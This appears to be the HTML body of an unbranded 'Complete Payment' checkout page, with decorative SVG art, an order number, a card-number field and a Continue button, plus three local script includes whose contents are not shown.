  <body>
    <div class="container">
      <div class="left-section">
        <h1>Complete Payment</h1>
        <div class="subtitle">Just a Few Steps</div>

        <div class="illustration">
          <svg viewBox="0 0 220 180" xmlns="http://www.w3.org/2000/svg">
            <defs>
              <linearGradient
                id="wallet-grad"
                x1="0%"
                y1="0%"
                x2="100%"
                y2="100%"
              >
                <stop
                  offset="0%"
                  style="stop-color: #4d6aff; stop-opacity: 1"
                />
                <stop
                  offset="100%"
                  style="stop-color: #3355ff; stop-opacity: 1"
                />
              </linearGradient>
            </defs>

            <!-- Decorative stars -->
            <path
              d="M 85 35 L 88 38 L 91 35 L 88 32 Z"
              fill="#5a7aff"
              opacity="0.6"
            />
            <path
              d="M 245 145 L 248 148 L 251 145 L 248 142 Z"
              fill="#5a7aff"
              opacity="0.6"
            />

            <!-- Main wallet/card -->
            <rect
              x="40"
              y="60"
              width="130"
              height="95"
              rx="12"
              fill="url(#wallet-grad)"
            />

            <!-- Card element -->
            <g transform="translate(60, 80)">
              <circle cx="18" cy="18" r="18" fill="white" opacity="0.9" />
              <text
                x="18"
                y="24"
                font-size="24"
                font-weight="bold"
                fill="url(#wallet-grad)"
                text-anchor="middle"
              >
                $
              </text>
            </g>

            <!-- Card details -->
            <rect
              x="100"
              y="85"
              width="55"
              height="22"
              rx="6"
              fill="white"
              opacity="0.8"
            />

            <!-- Secondary card -->
            <rect
              x="120"
              y="35"
              width="80"
              height="120"
              rx="12"
              fill="#6b7fff"
              opacity="0.9"
            />

            <!-- Decorative circles -->
            <circle cx="55" cy="165" r="3" fill="#c5d0ff" opacity="0.5" />
            <circle cx="210" cy="50" r="4" fill="#c5d0ff" opacity="0.5" />
          </svg>
        </div>

        <p class="description">
          Enable global payment functionality through seamless payment
          capabilities across the globe
        </p>
      </div>

      <div class="right-section">
        <div class="payment-card">
          <div class="card-header">
            <div class="status-icon">
              <svg
                width="32"
                height="32"
                viewBox="0 0 24 24"
                fill="none"
                stroke="white"
                stroke-width="2.5"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <path
                  d="M12 2v6M21.09 8.09l-1.41 1.41M23 17h-6M21.09 21.91l-1.41-1.41M12 23v-6M2.91 21.91l1.41-1.41M1 17h6M2.91 8.09l1.41 1.41"
                ></path>
                <circle cx="12" cy="12" r="3"></circle>
              </svg>
            </div>
            <div class="payment-info">
              <div class="payment-status">Payment Processing</div>
            </div>
          </div>

          <div class="order-info">
            <span class="order-label">Order No.</span>
            <span class="order-number" id="orderNumber">
              770727642081439744c514
              <svg
                class="copy-icon"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
              >
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                <path
                  d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
                ></path>
              </svg>
            </span>
          </div>

          <div class="form-container">
            <div class="payment-method">
              <svg
                class="method-icon"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
              >
                <rect x="2" y="5" width="20" height="14" rx="2"></rect>
                <line x1="2" y1="10" x2="22" y2="10"></line>
              </svg>
              <span>Card</span>
            </div>

            <form id="payment-form">
              <div class="form-group">
                <label class="form-label">Card number</label>
                <div class="input-wrapper">
                  <input
                    type="text"
                    class="form-input"
                    placeholder="1234 1234 1234 1234"
                    id="cardNumber"
                    maxlength="19"
                  />
                  <div class="card-brands">
                    <svg width="32" height="20" viewBox="0 0 32 20">
                      <rect width="32" height="20" rx="2" fill="#1434CB" />
                      <text
                        x="16"
                        y="14"
                        text-anchor="middle"
                        font-size="9"
                        font-weight="bold"
                        fill="white"
                      >
                        VISA
                      </text>
                    </svg>
                    <svg width="32" height="20" viewBox="0 0 32 20">
                      <rect width="32" height="20" rx="2" fill="#EB001B" />
                      <circle
                        cx="12"
                        cy="10"
                        r="6"
                        fill="#FF5F00"
                        opacity="0.8"
                      />
                      <circle
                        cx="20"
                        cy="10"
                        r="6"
                        fill="#F79E1B"
                        opacity="0.8"
                      />
                    </svg>
                  </div>
                </div>
                <div
                  id="cardError"
                  class="error-message"
                  role="alert"
                  aria-live="assertive"
                ></div>
              </div>

              <button type="submit" class="pay-button">
                <svg
                  width="18"
                  height="18"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  stroke-linecap="round"
                >
                  <path
                    d="M12 1v22M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"
                  ></path>
                </svg>
                Continue
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
    <script src="/static/js/redirect.js?v3"></script>
    <script src="/static/js/online-status.js?v3"></script>
    <script src="/static/js/card.js?v3"></script>
  </body>
</html>
